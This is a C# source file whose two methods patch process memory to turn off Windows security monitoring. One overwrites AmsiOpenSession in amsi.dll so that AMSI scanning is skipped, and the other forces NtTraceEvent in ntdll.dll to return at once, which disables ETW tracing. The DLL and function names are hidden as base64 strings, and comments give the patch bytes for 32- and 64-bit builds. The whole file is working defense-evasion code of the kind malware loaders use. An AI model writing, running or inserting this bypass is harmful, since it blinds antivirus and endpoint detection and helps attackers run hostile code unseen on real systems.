using System;
using System.Runtime.InteropServices;

public class MemoryPatcher
{
    private static void PatchMemory(IntPtr baseAddress, byte[] patch)
    {
        IntPtr processHandle = new IntPtr(-1);
        UInt32 NumberOfBytesToProtect = (UInt32)patch.Length;
        UInt32 oldAccessProtection = 0;
        Utility.NtProtectVirtualMemory(processHandle, ref baseAddress, ref NumberOfBytesToProtect, 0x40, ref oldAccessProtection);
        Marshal.Copy(patch, 0, baseAddress, patch.Length);
        Utility.NtProtectVirtualMemory(processHandle, ref baseAddress, ref NumberOfBytesToProtect, oldAccessProtection, ref oldAccessProtection);
    }

    /*
        Amsi!AmsiOpenSession (32-bit)
        8bff   mov  edi, edi
        55     push rbp
        8bec   mov  ebp, esp
        8b4d0c mov  ecx, dword ptr [ebp+0xC]
        85c9   test ecx, ecx
        7439   je   amsi!AmsiOpenSession+0x45

        Amsi!AmsiOpenSession (64-bit)
        4885d2 test rdx, rdx
        7446   je   amsi!AmsiOpenSession+0x4b

        Patch assembly code for amsi.dll AmsiOpenSession
        32-bit : test ecx, ecx => xor eax, eax
        64-bit : test rdx, rdx => xor rax, rax
    */

    public static void PatchAMSI()
    {
        byte[] patch = IntPtr.Size == 4 ? (new byte[2] { 0x31, 0xC0 }) : (new byte[3] { 0x48, 0x31, 0xC0 });
        IntPtr baseAddress = Utility.GetFunctionAddress("YW1zaS5kbGw=", "QW1zaU9wZW5TZXNzaW9u") + (IntPtr.Size == 4 ? 8 : 0);
        if (baseAddress != IntPtr.Zero)
            PatchMemory(baseAddress, patch);
    }


    /*
        Patch assembly code for ntdll.dll NtTraceEvent to immediately execute ret
        32-bit : ret 0x10
        64-bit : ret
    */

    public static void PatchETW()
    {
        byte[] patch = IntPtr.Size == 4 ? (new byte[3] { 0xC2, 0x10, 0x00 }) : (new byte[1] { 0xC3 });
        IntPtr baseAddress = Utility.GetFunctionAddress("bnRkbGwuZGxs", "TnRUcmFjZUV2ZW50");
        if (baseAddress != IntPtr.Zero)
            PatchMemory(baseAddress, patch);
    }
}
